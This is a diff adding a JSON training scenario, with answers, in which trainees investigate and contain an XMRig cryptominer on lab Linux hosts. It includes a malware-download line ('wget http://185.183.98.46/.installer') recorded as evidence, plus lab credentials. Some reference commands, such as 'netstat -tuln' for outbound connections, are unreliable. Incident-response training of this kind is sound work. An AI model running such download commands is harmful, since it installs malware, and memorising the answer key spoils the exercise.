@@ -1,0 +1,1333 @@
+{
+  "title": "2026-10-22_XMRig_Cryptominer_Investigation_1cd",
+  "description": "Investigate systems for cryptocurrency mining malware and identify the source of high CPU usage.",
+  "prerequisites": [
+    "Basic knowledge of Unix/Linux",
+    "Basic networking knowledge"
+  ],
+  "outcomes": [
+    "Usage of nmap",
+    "Usage of metasploit",
+    "Password cracking techniques"
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "The IT department has received reports of unusually high CPU usage on several Linux servers in the network. Initial investigations suggest that one or more systems may be infected with cryptocurrency mining malware. Your task is to investigate these systems, identify the source of the high CPU usage, and determine if any systems have been compromised by cryptocurrency mining malware."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "You have SSH access to the following systems with the username `cyrano` and password `cyrano`:\n- `miner-host` (192.168.50.5)\n- `second-host` (192.168.50.6)\n\nEnter `start` to begin the investigation.",
+      "local_content": "You have SSH access to the following systems with the username `cyrano` and password `cyrano`:\n- `miner-host` (192.168.50.5)\n- `second-host` (192.168.50.6)\n\nEnter `start` to begin the investigation. Local sandbox access is not required for this scenario."
+    },
+    {
+      "title": "Investigate Suspicious Services",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "sys-monitor",
+      "answer_variable_name": null,
+      "content": "Investigate the `miner-host` system and identify any unauthorized or suspicious services running on the host.",
+      "solution": "Check the status of all services and look for any that appear unusual or out of place. The suspicious service is `sys-monitor`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Check the status of all services and look for any that appear unusual or out of place.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `systemctl` command to list all services and their statuses.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for services that are not part of the standard system installation or have unusual names.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "service_check",
+          "prereq_state": [],
+          "cmd": "systemctl list-units --type=service",
+          "cmd_type": "bash-command",
+          "cmd_regex": "sys-monitor",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify High CPU Process",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "sys-monitor",
+      "answer_variable_name": null,
+      "content": "On the `miner-host` system, identify the process responsible for the abnormal CPU or resource utilization.",
+      "solution": "Use process monitoring tools to identify processes consuming high CPU resources and investigate their properties. The process responsible is `sys-monitor`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Use process monitoring tools to identify processes consuming high CPU resources and investigate their properties.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `top` command to list processes and their CPU usage.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for processes with unusually high CPU usage that do not correspond to known system processes.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "process_check",
+          "prereq_state": [],
+          "cmd": "top",
+          "cmd_type": "bash-command",
+          "cmd_regex": "sys-monitor",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Determine Suspicious Outbound Port",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "3333",
+      "answer_variable_name": null,
+      "content": "Determine which network port is used for suspicious outbound communication from the `miner-host` system.",
+      "solution": "Investigate active network connections and look for any unusual or unexpected outbound connections. The port number used is `3333`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Investigate active network connections and look for any unusual or unexpected outbound connections.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `netstat` command to list active network connections.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for connections to external IP addresses on non-standard ports.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "port_check",
+          "prereq_state": [],
+          "cmd": "netstat -tuln",
+          "cmd_type": "bash-command",
+          "cmd_regex": "3333",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Locate Malicious Executable",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "/usr/local/sbin/xmrig",
+      "answer_variable_name": null,
+      "content": "Locate the executable or file associated with the suspicious activity on the `miner-host` system.",
+      "solution": "Correlate the suspicious process with files on disk and investigate any unusual or recently modified files. The filename is `/usr/local/sbin/xmrig`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Correlate the suspicious process with files on disk and investigate any unusual or recently modified files.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `ls` command to list files in the `/usr/local/sbin/` directory.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for files with unusual names or modification times that do not correspond to known system files.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "file_check",
+          "prereq_state": [],
+          "cmd": "ls -la /usr/local/sbin/",
+          "cmd_type": "bash-command",
+          "cmd_regex": "xmrig",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify Installation Artifact",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "/tmp/.installer",
+      "answer_variable_name": null,
+      "content": "Identify the artifact responsible for installing or deploying the malicious software on the `miner-host` system.",
+      "solution": "Investigate installation artifacts and determine how the malware was introduced onto the system. The filename is `/tmp/.installer`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Investigate installation artifacts and determine how the malware was introduced onto the system.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `ls` command to list files in the `/tmp/` directory.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for files with unusual names or modification times that do not correspond to known system files.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "artifact_check",
+          "prereq_state": [],
+          "cmd": "ls -la /tmp/",
+          "cmd_type": "bash-command",
+          "cmd_regex": ".installer",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify External Host",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "185.183.98.46",
+      "answer_variable_name": null,
+      "content": "Determine the external host communicating with the `miner-host` system for suspicious outbound communication.",
+      "solution": "Analyze network connections and identify the destination IP address of the suspicious communication. The IP address is `185.183.98.46`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Analyze network connections and identify the destination IP address of the suspicious communication.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `netstat` command to list active network connections.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for connections to external IP addresses that do not correspond to known legitimate services.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "external_host_check",
+          "prereq_state": [],
+          "cmd": "netstat -tuln",
+          "cmd_type": "bash-command",
+          "cmd_regex": "185.183.98.46",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify Mining Pool Port",
+      "level_type": "TRAINING_LEVEL",
+      "order": 8,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "3333",
+      "answer_variable_name": null,
+      "content": "Identify the external service used by the `miner-host` system for cryptocurrency mining.",
+      "solution": "Analyze network traffic to identify the mining pool or command-and-control communication. The port number is `3333`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Analyze network traffic to identify the mining pool or command-and-control communication.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `netstat` command to list active network connections.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for connections to external IP addresses on non-standard ports.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "mining_pool_check",
+          "prereq_state": [],
+          "cmd": "netstat -tuln",
+          "cmd_type": "bash-command",
+          "cmd_regex": "3333",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Locate Configuration File",
+      "level_type": "TRAINING_LEVEL",
+      "order": 9,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "/home/cyrano/.config/sys-monitor/config.json",
+      "answer_variable_name": null,
+      "content": "Locate the configuration file used by the malicious software on the `miner-host` system.",
+      "solution": "Investigate malware artifacts to identify stored configuration information. The filename is `/home/cyrano/.config/sys-monitor/config.json`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Investigate malware artifacts to identify stored configuration information.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `ls` command to list files in the `/home/cyrano/.config/sys-monitor/` directory.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for files with unusual names or modification times that do not correspond to known system files.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "config_file_check",
+          "prereq_state": [],
+          "cmd": "ls -la /home/cyrano/.config/sys-monitor/",
+          "cmd_type": "bash-command",
+          "cmd_regex": "config.json",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify Log File",
+      "level_type": "TRAINING_LEVEL",
+      "order": 10,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "/var/log/.sys-mon",
+      "answer_variable_name": null,
+      "content": "Identify logs or artifacts created by the malicious software to record its activity on the `miner-host` system.",
+      "solution": "Discover hidden or unusual log files left by the malware. The filename is `/var/log/.sys-mon`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Discover hidden or unusual log files left by the malware.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `ls` command to list files in the `/var/log/` directory.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for files with unusual names or modification times that do not correspond to known system files.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "log_file_check",
+          "prereq_state": [],
+          "cmd": "ls -la /var/log/",
+          "cmd_type": "bash-command",
+          "cmd_regex": ".sys-mon",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify Service Persistence",
+      "level_type": "TRAINING_LEVEL",
+      "order": 11,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "sys-monitor",
+      "answer_variable_name": null,
+      "content": "Determine how the malicious software is automatically started after reboot on the `miner-host` system through a system service.",
+      "solution": "Identify service-based persistence mechanisms. The service name is `sys-monitor`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Identify service-based persistence mechanisms.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `systemctl` command to list all services and their statuses.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for services that are not part of the standard system installation or have unusual names.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "service_persistence_check",
+          "prereq_state": [],
+          "cmd": "systemctl list-units --type=service",
+          "cmd_type": "bash-command",
+          "cmd_regex": "sys-monitor",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify Scheduled Task Persistence",
+      "level_type": "TRAINING_LEVEL",
+      "order": 12,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "/etc/cron.d/sysupdate",
+      "answer_variable_name": null,
+      "content": "Determine whether the malicious software uses scheduled execution for persistence on the `miner-host` system.",
+      "solution": "Identify scheduled task persistence mechanisms. The scheduled task name is `sysupdate`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Identify scheduled task persistence mechanisms.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `crontab` command to list scheduled tasks.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for tasks that are not part of the standard system installation or have unusual names.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "scheduled_task_check",
+          "prereq_state": [],
+          "cmd": "crontab -l",
+          "cmd_type": "bash-command",
+          "cmd_regex": "sysupdate",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify Malware Installation Evidence",
+      "level_type": "TRAINING_LEVEL",
+      "order": 13,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "/home/cyrano/.bash_history",
+      "answer_variable_name": null,
+      "content": "Identify evidence showing how the malicious software was installed on the `miner-host` system.",
+      "solution": "Investigate logs, scripts, or artifacts revealing malware installation activity. The filename is `/home/cyrano/.bash_history`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Investigate logs, scripts, or artifacts revealing malware installation activity.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `cat` command to view the contents of the `/home/cyrano/.bash_history` file.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for commands or entries that indicate the download or execution of suspicious files.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "installation_evidence_check",
+          "prereq_state": [],
+          "cmd": "cat /home/cyrano/.bash_history",
+          "cmd_type": "bash-command",
+          "cmd_regex": "wget http://185.183.98.46/.installer",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify Lateral Movement Script",
+      "level_type": "TRAINING_LEVEL",
+      "order": 14,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "/usr/local/bin/sys-update.sh",
+      "answer_variable_name": null,
+      "content": "Identify scripts or tools used to propagate the malware to other systems from the `miner-host` system.",
+      "solution": "Analyze artifacts supporting malware propagation between hosts. The filename is `/usr/local/bin/sys-update.sh`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Analyze artifacts supporting malware propagation between hosts.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `ls` command to list files in the `/usr/local/bin/` directory.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for scripts with unusual names or modification times that do not correspond to known system files.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "lateral_movement_script_check",
+          "prereq_state": [],
+          "cmd": "ls -la /usr/local/bin/",
+          "cmd_type": "bash-command",
+          "cmd_regex": "sys-update.sh",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify File Transfer Mechanism",
+      "level_type": "TRAINING_LEVEL",
+      "order": 15,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "ssh",
+      "answer_variable_name": null,
+      "content": "Identify files or services used to transfer malware between systems from the `miner-host` system.",
+      "solution": "Correlate events across hosts to determine how malware was transferred. The service name is `ssh`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Correlate events across hosts to determine how malware was transferred.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `systemctl` command to list all services and their statuses.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for services that are not part of the standard system installation or have unusual names.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "file_transfer_mechanism_check",
+          "prereq_state": [],
+          "cmd": "systemctl list-units --type=service",
+          "cmd_type": "bash-command",
+          "cmd_regex": "ssh",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify Unauthorized Remote Access",
+      "level_type": "TRAINING_LEVEL",
+      "order": 16,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "192.168.50.6",
+      "answer_variable_name": null,
+      "content": "Identify unauthorized remote access used to spread the malware from the `miner-host` system.",
+      "solution": "Investigate authentication and remote access logs to identify lateral movement. The destination host IP address is `192.168.50.6`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Investigate authentication and remote access logs to identify lateral movement.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `grep` command to search for successful authentication attempts in the `/var/log/auth.log` file.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for authentication attempts from unusual IP addresses or users.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "unauthorized_remote_access_check",
+          "prereq_state": [],
+          "cmd": "grep 'Accepted' /var/log/auth.log",
+          "cmd_type": "bash-command",
+          "cmd_regex": "192.168.50.6",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify Secondary Compromised Host",
+      "level_type": "TRAINING_LEVEL",
+      "order": 17,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "192.168.50.6",
+      "answer_variable_name": null,
+      "content": "Determine which additional system has been compromised through lateral movement from the `miner-host` system.",
+      "solution": "Correlate indicators across hosts to identify secondary infections. The IP address is `192.168.50.6`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Correlate indicators across hosts to identify secondary infections.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `netstat` command to list active network connections.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for connections to other internal IP addresses that do not correspond to known legitimate services.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "secondary_compromised_host_check",
+          "prereq_state": [],
+          "cmd": "netstat -tuln",
+          "cmd_type": "bash-command",
+          "cmd_regex": "192.168.50.6",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Identify Malware Propagation Evidence",
+      "level_type": "TRAINING_LEVEL",
+      "order": 18,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "/home/cyrano/sys-update.log",
+      "answer_variable_name": null,
+      "content": "Identify evidence demonstrating that the malware spread to additional hosts from the `miner-host` system.",
+      "solution": "Analyze logs and system artifacts to reconstruct propagation activity. The filename is `/home/cyrano/sys-update.log`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Analyze logs and system artifacts to reconstruct propagation activity.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `ls` command to list files in the `/home/cyrano/` directory.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for log files with unusual names or modification times that do not correspond to known system files.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "malware_propagation_evidence_check",
+          "prereq_state": [],
+          "cmd": "ls -la /home/cyrano/",
+          "cmd_type": "bash-command",
+          "cmd_regex": "sys-update.log",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Collect Forensic Evidence",
+      "level_type": "TRAINING_LEVEL",
+      "order": 19,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "/var/log/.sys-mon",
+      "answer_variable_name": null,
+      "content": "Collect forensic evidence supporting the identified cryptomining activity on the `miner-host` system.",
+      "solution": "Gather relevant logs, process information, service configuration, persistence artifacts, and network evidence. Use the following command to create a tarball of the evidence: `tar -czvf forensic_evidence.tar.gz /var/log/.sys-mon /home/cyrano/.config/sys-monitor/config.json /home/cyrano/.bash_history`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Gather relevant logs, process information, service configuration, persistence artifacts, and network evidence.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `tar` command to create a tarball of the evidence files.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Include all relevant files and directories that support the identified cryptomining activity.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "forensic_evidence_collection",
+          "prereq_state": [],
+          "cmd": "tar -czvf forensic_evidence.tar.gz /var/log/.sys-mon /home/cyrano/.config/sys-monitor/config.json /home/cyrano/.bash_history",
+          "cmd_type": "bash-command",
+          "cmd_regex": "/var/log/.sys-mon",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Classify Activity",
+      "level_type": "TRAINING_LEVEL",
+      "order": 20,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "The activity is malicious",
+      "answer_variable_name": null,
+      "content": "Determine whether the observed activity on the `miner-host` system is malicious or benign and justify the conclusion.",
+      "solution": "Correlate collected evidence to classify the activity as unauthorized cryptomining or legitimate system behavior. The activity is malicious.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Correlate collected evidence to classify the activity as unauthorized cryptomining or legitimate system behavior.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Review the collected forensic evidence to identify indicators of compromise.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for evidence of unauthorized processes, network connections, and persistence mechanisms.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "activity_classification",
+          "prereq_state": [],
+          "cmd": "echo 'The activity is malicious.'",
+          "cmd_type": "bash-command",
+          "cmd_regex": "The activity is malicious",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Block Malicious Communication",
+      "level_type": "TRAINING_LEVEL",
+      "order": 21,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "iptables -A OUTPUT -d 185.183.98.46 -p tcp --dport 3333 -j DROP",
+      "answer_variable_name": null,
+      "content": "Block malicious outbound communication from the `miner-host` system while preserving legitimate network activity.",
+      "solution": "Apply firewall or network controls to contain the malware. The IP address or port number that was blocked is `185.183.98.46:3333`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Apply firewall or network controls to contain the malware.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `iptables` command to block outbound communication to the malicious IP address and port.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Block the specific IP address and port used for malicious communication.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "block_malicious_communication",
+          "prereq_state": [],
+          "cmd": "iptables -A OUTPUT -d 185.183.98.46 -p tcp --dport 3333 -j DROP",
+          "cmd_type": "bash-command",
+          "cmd_regex": "iptables -A OUTPUT -d 185.183.98.46 -p tcp --dport 3333 -j DROP",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Terminate Malicious Process",
+      "level_type": "TRAINING_LEVEL",
+      "order": 22,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "systemctl stop sys-monitor",
+      "answer_variable_name": null,
+      "content": "Stop the malicious process or service responsible for the cryptomining activity on the `miner-host` system.",
+      "solution": "Safely terminate malicious execution while minimizing impact on legitimate services. The process or service that was terminated is `sys-monitor`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Safely terminate malicious execution while minimizing impact on legitimate services.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `systemctl` command to stop the malicious service.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Stop the service using its name.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "terminate_malicious_process",
+          "prereq_state": [],
+          "cmd": "systemctl stop sys-monitor",
+          "cmd_type": "bash-command",
+          "cmd_regex": "systemctl stop sys-monitor",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Remove Service Persistence",
+      "level_type": "TRAINING_LEVEL",
+      "order": 23,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "systemctl disable sys-monitor",
+      "answer_variable_name": null,
+      "content": "Remove the service-based persistence mechanism used by the malware on the `miner-host` system.",
+      "solution": "Eliminate service persistence to prevent reinfection after reboot. The service that was removed is `sys-monitor`.",
+      "solution_penalized": true,
+      "hints": [
+        {
